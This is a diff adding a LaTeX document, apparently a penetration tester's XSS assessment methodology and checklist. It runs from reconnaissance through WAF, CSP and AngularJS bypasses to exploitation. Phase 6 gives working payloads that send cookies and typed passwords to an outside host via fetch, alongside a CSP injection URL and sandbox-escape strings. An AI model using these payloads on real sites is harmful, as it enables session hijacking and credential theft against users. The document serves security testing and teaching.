@@ -1,0 +1,324 @@
+\documentclass[12pt]{article}
+\usepackage[table]{xcolor}
+\usepackage{geometry}
+\usepackage{amsmath}
+\usepackage{listings}
+\usepackage{tcolorbox}
+\usepackage{hyperref}
+\usepackage{enumitem}
+\usepackage{array}
+\usepackage{booktabs}
+
+\geometry{a4paper, margin=1in}
+\definecolor{lightblue}{RGB}{240,248,255}
+\definecolor{lightgreen}{RGB}{240,255,240}
+\definecolor{lightred}{RGB}{255,240,240}
+
+\title{\textbf{Complete XSS Vulnerability Assessment Methodology \& Checklist}}
+\author{Eyad Islam El-Taher \\ Security Researcher}
+\date{}
+
+\begin{document}
+
+\maketitle
+
+\section*{Executive Summary}
+This document provides a comprehensive methodology for identifying and exploiting Cross-Site Scripting (XSS) vulnerabilities based on extensive research and practical experience.
+
+\section{Phase 1: Reconnaissance \& Information Gathering}
+
+\begin{tcolorbox}[title={\textbf{1.1 Application Mapping}}, colback=lightblue]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Identify all user input points:}
+    \begin{itemize}
+        \item URL parameters (GET)
+        \item Form fields (POST) 
+        \item HTTP headers (Cookies, User-Agent, Referer)
+        \item File upload functionality
+        \item API endpoints
+    \end{itemize}
+    
+    \item \textbf{Map client-side JavaScript:}
+    \begin{itemize}
+        \item Identify jQuery usage (\$ function, .ajax(), etc.)
+        \item Find AngularJS applications (ng-app, \{\{ \}\})
+        \item Locate template literals (backticks)
+        \item Identify dangerous sinks (innerHTML, eval(), document.write())
+    \end{itemize}
+    
+    \item \textbf{Analyze CSP headers:}
+    \begin{itemize}
+        \item Check Content-Security-Policy headers
+        \item Look for CSP injection points
+        \item Identify allowed sources and directives
+    \end{itemize}
+\end{itemize}
+\end{tcolorbox}
+
+\section{Phase 2: Initial Testing \& Context Identification}
+
+\begin{tcolorbox}[title={\textbf{2.1 Context Detection Methodology}}, colback=lightgreen]
+\begin{enumerate}[leftmargin=*]
+    \item \textbf{Insert unique marker:} Use string like "Eyaduitto"
+    \item \textbf{View page source} and analyze how string is handled
+    \item \textbf{Test WAF behavior:} 
+    \begin{lstlisting}[basicstyle=\ttfamily\small]
+    <Eyaduitto> "Eyad'uitto'
+    \end{lstlisting}
+    \item \textbf{Identify context:}
+    \begin{itemize}
+        \item HTML element context
+        \item HTML attribute context  
+        \item JavaScript context
+        \item URL context
+        \item CSS context
+    \end{itemize}
+\end{enumerate}
+\end{tcolorbox}
+
+\begin{tcolorbox}[title={\textbf{2.2 Basic Payload Testing}}, colback=lightblue]
+\begin{tabular}{lll}
+\toprule
+\textbf{Payload} & \textbf{Context} & \textbf{Purpose} \\
+\midrule
+\texttt{<script>alert(1)</script>} & HTML & Basic script test \\
+\texttt{<img src=x onerror=alert(1)>} & HTML & Event handler test \\
+\texttt{<svg onload=alert(1)>} & HTML & SVG vector test \\
+\texttt{" onmouseover="alert(1)} & Attribute & Attribute escape \\
+\texttt{\$\{alert(1)\}} & JS Template & Template literal \\
+\texttt{-alert(1)} & JS String & Operator injection \\
+\bottomrule
+\end{tabular}
+\end{tcolorbox}
+
+\section{Phase 3: Advanced Bypass Techniques}
+
+\begin{tcolorbox}[title={\textbf{3.1 WAF Bypass Strategies}}, colback=lightred]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Tag \& Attribute Fuzzing:}
+    \begin{itemize}
+        \item Use Burp Intruder with XSS cheat sheet tags
+        \item Test allowed HTML tags first
+        \item Then fuzz events for allowed tags
+    \end{itemize}
+    
+    \item \textbf{Encoding Techniques:}
+    \begin{itemize}
+        \item HTML entity encoding
+        \item URL encoding
+        \item Multi-layer encoding
+        \item Unicode encoding
+    \end{itemize}
+    
+    \item \textbf{JavaScript Tricks:}
+    \begin{itemize}
+        \item Use \texttt{/**/} instead of spaces
+        \item String concatenation
+        \item Template literals with \$\{\}
+        \item Operator injection (-, +, |)
+    \end{itemize}
+\end{itemize}
+\end{tcolorbox}
+
+\begin{tcolorbox}[title={\textbf{3.2 Special Vector Attacks}}, colback=lightgreen]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{SVG File Upload:}
+    \begin{lstlisting}[basicstyle=\ttfamily\small]
+    <?xml version="1.0"?>
+    <svg xmlns="http://www.w3.org/2000/svg">
+        <script>alert(document.domain)</script>
+    </svg>
+    \end{lstlisting}
+    
+    \item \textbf{Swagger UI Exploitation:}
+    \begin{itemize}
+        \item Test: \texttt{?configUrl=}, \texttt{?url=}, \texttt{?config=}
+        \item Use external payload URLs
+    \end{itemize}
+    
+    \item \textbf{AngularJS DOM XSS:}
+    \begin{itemize}
+        \item Test: \{\{1+1\}\} for verification
+        \item Use Angular-specific payloads
+    \end{itemize}
+\end{itemize}
+\end{tcolorbox}
+
+\section{Phase 4: DOM-based XSS Assessment}
+
+\begin{tcolorbox}[title={\textbf{4.1 Source \& Sink Analysis}}, colback=lightblue]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Identify Sources:}
+    \begin{itemize}
+        \item \texttt{document.URL}, \texttt{location.hash}
+        \item \texttt{window.name}, \texttt{document.referrer}
+        \item \texttt{localStorage}, \texttt{sessionStorage}
+        \item PostMessage events
+    \end{itemize}
+    
+    \item \textbf{Identify Dangerous Sinks:}
+    \begin{itemize}
+        \item \texttt{innerHTML}, \texttt{outerHTML}
+        \item \texttt{document.write()}
+        \item \texttt{eval()}, \texttt{setTimeout()}, \texttt{setInterval()}
+        \item \texttt{location.href}, \texttt{location.assign()}
+        \item \texttt{Element.setAttribute()}
+    \end{itemize}
+\end{itemize}
+\end{tcolorbox}
+
+\begin{tcolorbox}[title={\textbf{4.2 Advanced DOM Exploitation}}, colback=lightgreen]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{AngularJS Sandbox Escape:}
+\begin{lstlisting}[basicstyle=\ttfamily\small]
+   ?search=1&toString().constructor.prototype.charAt=[].join;
+   [1]|orderBy:toString().constructor.fromCharCode(120,61,97,
+   108,101,114,116,40,49,41)=1
+    \end{lstlisting}
+    
+    \item \textbf{Angular Event-based XSS:}
+    \begin{lstlisting}[basicstyle=\ttfamily\small]
+    <input id=x ng-focus=$event.composedPath()|orderBy:
+    '(z=alert)(document.cookie)'>#x
+    \end{lstlisting}
+    
+    \item \textbf{SVG Animation Bypass:}
+    \begin{lstlisting}[basicstyle=\ttfamily\small]
+    <svg><a><animate attributeName=href values=javascript:
+    alert(1) /><text x=20 y=20>Click me</text></a></svg>
+    \end{lstlisting}
+\end{itemize}
+\end{tcolorbox}
+
+\section{Phase 5: CSP Analysis \& Bypass}
+
+\begin{tcolorbox}[title={\textbf{5.1 CSP Assessment Checklist}}, colback=lightred]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Check CSP Headers:}
+    \begin{itemize}
+        \item Look for \texttt{Content-Security-Policy} header
+        \item Analyze directives and sources
+        \item Check for \texttt{report-uri} with dynamic parameters
+    \end{itemize}
+    
+    \item \textbf{CSP Injection Testing:}
+    \begin{itemize}
+        \item Test parameters in CSP headers
+        \item Look for \texttt{token} parameters in \texttt{report-uri}
+        \item Attempt directive injection
+    \end{itemize}
+    
+    \item \textbf{CSP Bypass Techniques:}
+    \begin{itemize}
+        \item Inject \texttt{;script-src-elem 'unsafe-inline'}
+        \item Use Angular events to bypass script restrictions
+        \item Leverage allowed domains for script loading
+    \end{itemize}
+\end{itemize}
+\end{tcolorbox}
+
+\begin{tcolorbox}[title={\textbf{5.2 CSP Injection Example}}, colback=lightblue]
+\begin{lstlisting}[basicstyle=\ttfamily\small]
+Original CSP:
+Content-Security-Policy: default-src 'self'; script-src 'self'; 
+report-uri /csp-report?token=default_value
+
+Injection URL:
+https://target.com/?search=<script>alert(1)</script>
+&token=;script-src-elem 'unsafe-inline'
+
+Resulting CSP:
+Content-Security-Policy: default-src 'self'; script-src 'self';
+report-uri /csp-report?token=;script-src-elem 'unsafe-inline'
+\end{lstlisting}
+\end{tcolorbox}
+
+\section{Phase 6: Exploitation \& Impact Assessment}
+
+\begin{tcolorbox}[title={\textbf{6.1 Proof of Concept Payloads}}, colback=lightgreen]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Cookie Stealing:}
+    \begin{lstlisting}[basicstyle=\ttfamily\small]
+    <script>fetch('https://collaborator.net', {
+        method:'POST', mode:'no-cors', body:document.cookie
+    });</script>
+    \end{lstlisting}
+    
+    \item \textbf{Credential Theft:}
+    \begin{lstlisting}[basicstyle=\ttfamily\small]
+  <input name=username id=username>
+  <input type=password name=password onchange="if(this.value.
+  length) 
+  fetch('https://collaborator.net', {method:'POST',
+   mode:'no-cors', body:username.value+':'+this.value});">
+    \end{lstlisting}
+    
+    \item \textbf{CSRF Token Theft:}
+    \begin{itemize}
+        \item Read CSRF tokens via XSS
+        \item Make authenticated requests with stolen tokens
+        \item Change email/password on behalf of user
+    \end{itemize}
+\end{itemize}
+\end{tcolorbox}
+
+\begin{tcolorbox}[title={\textbf{6.2 Client-Side Validation Bypass}}, colback=lightblue]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Developer Tools Manipulation:}
+    \begin{itemize}
+        \item Remove \texttt{disabled} attributes from buttons
+        \item Change input types (email → text)
+        \item Modify \texttt{maxlength} attributes
+        \item Remove/change form patterns
+    \end{itemize}
+    
+    \item \textbf{Legitimate-looking Payloads:}
+    \begin{lstlisting}[basicstyle=\ttfamily\small]
+    foo@example.com"><img src= onerror=alert(1)>
+    \end{lstlisting}
+\end{itemize}
+\end{tcolorbox}
+
+\section{Phase 7: Verification \& Reporting}
+
+\begin{tcolorbox}[title={\textbf{7.1 Verification Methods}}, colback=lightgreen]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{Automated Verification:}
+    \begin{itemize}
+        \item Use XSS.report for automatic verification
+        \item Monitor Burp Collaborator for callbacks
+        \item Check for successful payload execution
+    \end{itemize}
+    
+    \item \textbf{Manual Verification:}
+    \begin{itemize}
+        \item Test in multiple browsers
+        \item Verify payload persistence (stored XSS)
+        \item Check impact on different user roles
+    \end{itemize}
+    
+    \item \textbf{Impact Assessment:}
+    \begin{itemize}
+        \item Session hijacking capability
+        \item Credential theft potential
+        \item CSRF protection bypass
+        \item Privilege escalation possibilities
+    \end{itemize}
+\end{itemize}
+\end{tcolorbox}
+
+\begin{tcolorbox}[title={\textbf{7.2 Key Testing Notes}}, colback=lightred]
+\begin{itemize}[leftmargin=*]
+    \item \textbf{HTTP-Only Cookies:} Cannot be stolen via XSS
+    \item \textbf{URL Fragment:} Some payloads require direct URL placement
+    \item \textbf{Canonical Links:} May affect URL parameter processing
+    \item \textbf{Content-Type Headers:} \texttt{image/svg+xml} indicates SVG XSS potential
+    \item \textbf{jQuery Detection:} Look for \$ function and jQuery-specific methods
+    \item \textbf{Iframe Usage:} Powerful for real-world exploitation
+\end{itemize}
+\end{tcolorbox}
+
+\section*{Conclusion}
+This methodology provides a systematic approach to XSS vulnerability assessment, covering from basic reconnaissance to advanced exploitation techniques. The checklist ensures comprehensive testing while the structured approach helps in identifying complex vulnerability chains and bypass mechanisms.
+
+\end{document}
